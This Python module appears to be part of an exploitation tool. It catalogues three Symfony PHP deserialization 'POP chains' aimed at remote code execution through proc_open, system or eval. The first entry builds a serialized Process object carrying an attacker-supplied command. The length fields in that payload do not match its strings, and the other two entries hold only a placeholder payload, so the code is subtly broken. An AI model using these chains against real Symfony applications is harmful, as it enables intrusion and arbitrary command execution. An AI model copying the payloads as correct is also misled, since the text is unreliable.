"""Symfony POP chains (3.x - 5.x)."""
from . import POPChain

SYMFONY_CHAINS: list = [
    POPChain(
        name="symfony_rce_process",
        framework="Symfony",
        gadget_classes=["Symfony\\Component\\Process\\Process"],
        entry_point="__destruct",
        sink="proc_open(cmd)",
        command_param="cmd",
        serialize_code=r"""b'O:35:"Symfony\\Component\\Process\\Process":1:{s:8:"\x00*\x00cmd";s:' + str(len(__command__)).encode() + b':"' + __command__.encode() + b'";}'""",
        notes="Symfony 3.x-5.x. Process::__destruct -> stop() -> proc_open().",
    ),
    POPChain(
        name="symfony_rce_cache_adapter",
        framework="Symfony",
        gadget_classes=["Symfony\\Component\\Cache\\Adapter\\ProxyAdapter"],
        entry_point="__destruct",
        sink="system(...)",
        command_param="key",
        serialize_code=r"""b'O:8:"Symfony":0:{}'""",
        notes="Symfony Cache adapter deserialization RCE.",
    ),
    POPChain(
        name="symfony_rce_app_kernel",
        framework="Symfony",
        gadget_classes=["Symfony\\Component\\HttpKernel\\Kernel", "Symfony\\Component\\HttpFoundation\\Request"],
        entry_point="__destruct",
        sink="eval(...) / call_user_func(...)",
        command_param="callback",
        serialize_code=r"""b'O:8:"Symfony":0:{}'""",
        notes="Symfony Kernel POP chain via HttpKernel.",
    ),
]
